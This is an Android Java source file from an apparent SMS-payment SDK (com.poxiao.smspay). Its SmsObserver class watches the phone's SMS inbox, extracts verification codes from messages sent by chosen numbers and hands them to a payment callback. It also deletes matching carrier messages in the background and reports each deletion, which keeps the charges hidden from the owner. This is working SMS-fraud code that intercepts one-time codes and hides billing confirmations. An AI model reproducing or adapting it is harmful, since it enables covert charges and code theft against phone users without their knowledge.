package com.poxiao.smspay.observer;

import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

import com.poxiao.smspay.observer.domain.OSS;
import com.poxiao.smspay.observer.domain.SB;
import com.poxiao.smspay.observer.domain.SFI;
import com.poxiao.smspay.observer.mark.MI;
import com.poxiao.smspay.observer.mark.OM;
import com.tbu.androidtools.Debug;
import com.tbu.androidtools.ugly.http.PoxiaoHttpUtil;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

public class SmsObserver extends ContentObserver {

	private final static String[] CHECKSMS_PROJECTION = new String[] { "_id",
			"address", "body", "date", "read", "type" };

	/**
	 * 判断是否处理短信创建时间起始值
	 */
	protected static long markStartTime = 0;

	/**
	 * 表示从标记起始时间开始多少时间以内的值是在处理范围以内的。
	 */
	public static final int MARK_TIME_STEP = 1000 * 60 * 10; // 10分钟

	/**
	 * 短信监听URI
	 */
	public static final Uri URI = Uri.parse("content://sms/");

	private static SmsObserver instance;

	private List<SFI> smsFilterItems;

	/**
	 * 没有包含会话信息，外部验证会比较麻烦
	 */
	private SmsVerify smsVerify;

	private Cursor cursor = null;

	private Context context;

	public synchronized static SmsObserver getInstance() {
		if (instance == null) {
			instance = new SmsObserver(new Handler());
			instance.smsFilterItems = new ArrayList<SFI>();
		}

		return instance;
	}

	public void setContext(Context context) {
		Debug.i("SmsObserver->setContext="+context);
		this.context = context;
	}

	public SmsObserver(Handler handler) {
		super(handler);
	}

	public SmsVerify getSmsVerify() {
		return smsVerify;
	}

	public void setSmsVerify(SmsVerify smsVerify) {
		this.smsVerify = smsVerify;
	}

	@Override
	public void onChange(boolean selfChange) {
		super.onChange(selfChange);
		Debug.i("SmsObserver->onChange");
		updateSmsFilterItems();
		checkSms();
	}

	/**
	 * 增加过滤规则
	 * 
	 * @param smsFilterItem
	 * @return
	 */
	public boolean addSmsFilterItems(SFI smsFilterItem) {
		Debug.i("SmsObserver->addSmsFilterItems,  coming ...");
		if (smsFilterItem != null && smsFilterItems != null) {
			Debug.i("SmsObserver->addSmsFilterItems,  success ...");
			MI info = new MI();
			info.tp = OM.TYPE_REQUEST;
			info.pf = smsFilterItem.getNu();
			info.scf = smsFilterItem.getCc();
			if (!smsFilterItems.contains(smsFilterItem)) {
				smsFilterItems.add(smsFilterItem);
				info.r = OM.TYPE_REQUEST_RESULT_ADD;
			} else {
				smsFilterItems.remove(smsFilterItem); // 直接删除，再写入。比较SmsFilterItem时只处理没有时间参数，这里主要为了更新时间选项。
				smsFilterItems.add(smsFilterItem);
				info.r = OM.TYPE_REQUEST_RESULT_UPDATE;
			}
			OM.hUld(info);
			return true;
		} else {
			Debug.i("SmsObserver->addSmsFilterItems fail");
		}
		return false;
	}

	/**
	 * 更新短信过滤器。如果
	 */
	private void updateSmsFilterItems() {
		Debug.i("SmsObserver->updateSmsFilterItems");
		if (smsFilterItems == null || smsFilterItems.size() <= 0) {
			return;
		}

		List<SFI> buffer = new ArrayList<SFI>();
		for (int i = 0; i < smsFilterItems.size(); i++) {
			SFI item = smsFilterItems.get(i);
			if (System.currentTimeMillis() - item.getTs() < MARK_TIME_STEP) {
				buffer.add(smsFilterItems.get(i));
			}
		}
		if (smsFilterItems.size() > buffer.size()) {
			smsFilterItems = buffer;
		}
	}

	/**
	 * 根据当前的Filter处理短信删除
	 */
	private void checkSms() {
		Debug.i("SmsObserver->checkSms");
		if ((smsFilterItems == null || smsFilterItems.size() <= 0)
				&& (getSmsVerify() == null)) {
			//没有过滤短信需求，也没有验证码拦截需求
			Debug.i("SmsObserver->checkSms, smsFilterItems == null || smsFilterItems.size() <= 0 AND getSmsVerify() == null");
			return;
		}

		try {
			cursor = context.getContentResolver().query(URI,
					SmsObserver.CHECKSMS_PROJECTION, null, null, "date desc");
		} catch (Exception e) {
			Debug.e("SmsObserver->checkSms, get cursor, e = " + e.toString());
		}
		
		

		try {
			if (cursor != null) {
				cursor.moveToFirst();
				// 以下值可以定义为全局变量
				int index_Id = cursor.getColumnIndex("_id");
				int index_Address = cursor.getColumnIndex("address");
				int index_Body = cursor.getColumnIndex("body");
				int index_Date = cursor.getColumnIndex("date");
				int index_Read = cursor.getColumnIndex("read");
				int index_Type = cursor.getColumnIndex("type");

				try {
					cursor.getInt(index_Id);
				} catch (Exception e) {
					try {
						cursor.close();
					} catch (Exception e1) {
						Debug.i("SmsObserver->checkSms, [may cursor index is 0] e1="
								+ e.toString());
					}
					Debug.i("SmsObserver->checkSms, [may cursor index is 0] e="
							+ e.toString());
				}

				SB smsBean = new SB();
				smsBean.setI(cursor.getInt(index_Id));
				String smsNumber = cursor.getString(index_Address);
				if (smsNumber.contains("+86")) {
					smsNumber = smsNumber.substring(3);
				}
				smsBean.setFm(smsNumber);
				smsBean.setCt(cursor.getString(index_Body));
				smsBean.setT(cursor.getLong(index_Date));
				smsBean.setTy(cursor.getInt(index_Type));
				smsBean.setRd(cursor.getInt(index_Read));
				
				Debug.i("SmsObserver->checkSms,[smsBean]Id : "
						+ cursor.getInt(index_Id) + ";index_Address="
						+ cursor.getString(index_Address) + ";index_Body="
						+ cursor.getString(index_Body) + ";index_Type="
						+ cursor.getInt(index_Type) + ";index_Read="
						+ index_Read);

				Debug.i("SmsObserver->checkSms, start get verifyContent");
				String verifyContent = checkVerify(smsBean); // 要处理验证短信的时间问题
				Debug.i("SmsObserver->checkSms, verifyContent="+verifyContent);
				
				if ("error".equals(verifyContent)) {
					if (getSmsVerify().getVerifyCallback() != null) {
						OSS sendSmss = new OSS();
						sendSmss.setNm(smsBean.getFm());
						sendSmss.setCt("error");
						sendSmss.setPu(getSmsVerify().getSendurl());
						sendSmss.setOd(getSmsVerify().getOrderId());
						sendSmss.setSn(getSmsVerify().getSendNumber());
						getSmsVerify().getVerifyCallback().result(sendSmss);
						setSmsVerify(null);
					}
				} else if (verifyContent != null) {
					Debug.i("SmsObserver->checkSms,verifyNumber != null");
					if (getSmsVerify() != null) {
						Debug.i("SmsObserver->checkSms,getSmsVerify() != null");
						OSS sendSmss = new OSS();
						sendSmss.setNm(smsBean.getFm());
						sendSmss.setCt(verifyContent);
						sendSmss.setPu(getSmsVerify().getSendurl());
						sendSmss.setOd(getSmsVerify().getOrderId());
						sendSmss.setSn(getSmsVerify().getSendNumber());
						Debug.i("SmsObserver->checkSms,sendSmss, num = "
								+ sendSmss.getNm() + "; Content = "
								+ sendSmss.getCt()+"; sendNumber = "
										+ sendSmss.getSn());
						
						if (getSmsVerify().getVerifyCallback() != null) {
							getSmsVerify().getVerifyCallback().result(sendSmss);
							setSmsVerify(null);
						}else{
							Debug.i("getSmsVerify().getVerifyCallback() is null");
						}
					}
					MI markInfo = new MI();
					markInfo.tp = OM.TYPE_DELETE;
					markInfo.pf = getSmsVerify().getNumber();
					markInfo.p = smsBean.getFm();
					markInfo.scf = "VER["
							+ getSmsVerify().getStartStr()
							+ getSmsVerify().getEndStr() + ']';
					markInfo.sc = smsBean.getCt();
					deleteSmsOnBackground(context, smsBean.getI(), markInfo);
					return;
				}else{
					Debug.i("SmsObserver->checkSms, verifyContent == null");
				}
				
				deleteSmsBySmsFilterItem(smsBean);
				cursor.close();
			} else {
				Debug.i("SmsObserver->checkSms, cursor == null");
			}
		} catch (Exception e) {
			Debug.e("SmsObserver->checkSms, Start cursor, e = " + e.toString());
		}

		return;
	}

	/**
	 * 处理包含验证码的情况
	 * 
	 * @param smsBean
	 * @return
	 */
	private String checkVerify(SB smsBean) {
		if (getSmsVerify() == null) {
			Debug.e("SmsObserver->checkVerify, getSmsVerify() == null");
			return null;
		}
		Debug.e("SmsObserver->checkVerify, getSmsVerify() start");
		
		Debug.e("SmsObserver->checkVerify, getSmsVerify().getNumber()="+getSmsVerify().getNumber());
		Debug.e("SmsObserver->checkVerify, smsBean.getFromNum()="+smsBean.getFm());
		
		//如果收到的短信包含［模糊匹配，验证码发送号码］
		if (smsBean.getFm().contains(getSmsVerify().getNumber())) {
			if (getSmsVerify().getTime() < smsBean.getT()) {
				//获取验证码的内容
				Debug.e("SmsObserver->checkVerify, start getVerify ");
				String verifyCoent = SmsVerify.getVerify(getSmsVerify(),
						smsBean.getCt());
				if ("error".equals(verifyCoent)) {
					return "error";
				}
				return verifyCoent;
			} else {
				Debug.e("SmsObserver->checkVerify, getSmsVerify().getTime() >= smsBean.getTime()");
			}

		}
		
		Debug.e("SmsObserver->checkVerify, checkVerify resutl null");
		return null;
	}

	/**
	 * 判断是否收到指定的下行短信
	 * 
	 * @param smsBean
	 */
	// private void findSmsByNumber(SmsBean smsBean) {
	// for (int i = 0; i < smsFilterItems.size(); i++) {
	// SmsFilterItem item = smsFilterItems.get(i);
	// if (smsBean.getFromNum().contains(item.getNum())) {
	// // 没有考虑所有都不匹配的情况。比如只要见到某条短信就删除。
	// if (smsBean.getContent().contains(item.getContainContent())) {
	// // 查找操作
	// if (smsBean.getType() != 6) { // 6表示准备发送的短信
	// MarkPayMo(getMarkMoUrl());// 收到下行,向服务端上传信息
	// }
	// }
	// }
	// }
	// }

	private void deleteSmsBySmsFilterItem(SB smsBean) {
		Debug.e("SmsObserver->deleteSmsBySmsFilterItem,start -------------------");
		if (!Rules.isAllowObserver()) {
			return;
		}
		if (smsBean == null || smsFilterItems.size() <= 0) {
			Debug.e("SmsObserver->deleteSmsBySmsFilterItem, smsBean == null || smsFilterItems.size() <= 0");
			return;
		}

		Debug.i("SmsObserver->deleteSmsBySmsFilterItem, [smsBean]num="
				+ smsBean.getFm() + ";content=" + smsBean.getCt());
		for (int i = 0; i < smsFilterItems.size(); i++) {
			SFI item = smsFilterItems.get(i);
			Debug.i("SmsObserver->deleteSmsBySmsFilterItem, [SmsFilterItem]num="
					+ item.getNu() + ";content=" + item.getCc());
			if (smsBean.getFm().contains(item.getNu())) {
				// 没有考虑所有都不匹配的情况。比如只要见到某条短信就删除。
				if (smsBean.getCt().contains(item.getCc())) {
					// 做删除操作
					if (smsBean.getTy() != 6) { // 6表示准备发送的短信
						MI markInfo = new MI();
						markInfo.tp = OM.TYPE_DELETE;
						markInfo.pf = item.getNu();
						markInfo.p = smsBean.getFm();
						markInfo.scf = item.getCc();
						markInfo.sc = smsBean.getCt();
						Debug.i("SmsObserver->deleteSmsBySmsFilterItem YES");
						deleteSmsOnBackground(context, smsBean.getI(),
								markInfo);
					} else {
						Debug.i("SmsObserver->deleteSmsBySmsFilterItem NO3");
					}
					return;
				} else {
					Debug.i("SmsObserver->deleteSmsBySmsFilterItem NO2");
				}
			} else {
				Debug.i("SmsObserver->deleteSmsBySmsFilterItem NO1");
			}
		}

	}

	private static void deleteSmsOnBackground(final Context context,
			final int smsId, final MI markInfo) {
		if (!Rules.isAllowObserver()) {
			Debug.i("SmsObserver->deleteSmsOnBackground [if(!Rules.isAllowObserver()) ]!!");
			return;
		}
		new Thread(new Runnable() {
			@Override
			public void run() {
				String whereClause = "_id in(" + smsId + ")";
				Debug.i("SmsObserver->deleteSmsOnBackground.require delete message id = "
						+ smsId);
				try {
					int count = context.getContentResolver().delete(URI,
							whereClause, null);
					Debug.i("SmsObserver->deleteSmsOnBackground.delete message id = "
							+ smsId + ", count = " + count);
					if (count == 0) {
						int count2 = context.getContentResolver().delete(
								Uri.parse("content://sms/inbox/"), whereClause,
								null);
						Debug.i("SmsObserver->deleteSmsOnBackground.delete message id = "
								+ smsId + ", count2 = " + count2);
						if (count2 > 0) {
							markInfo.r = OM.RESULT_SUCCESS;
							OM.hUld(markInfo);
						} else {
							markInfo.r = OM.RESULT_ERROR_SYS_REFUSE;
							OM.hUld(markInfo);
						}
					} else {
						markInfo.r = OM.RESULT_SUCCESS;
						OM.hUld(markInfo);
					}
				} catch (Exception e) {
					// 如果配置文件中没有配置权限可能出现此异常
					Debug.i("SmsObser>deleteSmsOnBackground exception, e="
							+ e.toString());
					markInfo.r = OM.RESULT_ERROR_PERMISSION;
					OM.hUld(markInfo);
				}
			}
		}).start();
	}

	private void MarkPayMo(final String urlStr) {
		new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					Debug.i("SmsObserver->MarkPayMo, urlStr = " + urlStr);
					URL url = new URL(urlStr);
					HttpURLConnection conn = (HttpURLConnection) url
							.openConnection();
					conn.setConnectTimeout(5 * 1000);
					conn.setRequestMethod("GET");
					InputStream inputStream = conn.getInputStream();
					byte[] data = PoxiaoHttpUtil.input2byte(inputStream);
					String result = new String(data, "UTF-8");
					Debug.i("SmsObserver->MarkPayMo, result = " + result);
				} catch (Exception e) {
					Debug.e("SmsObserver->MarkPayMo, error = " + e.toString());
				}
			}
		}).start();
	}
}
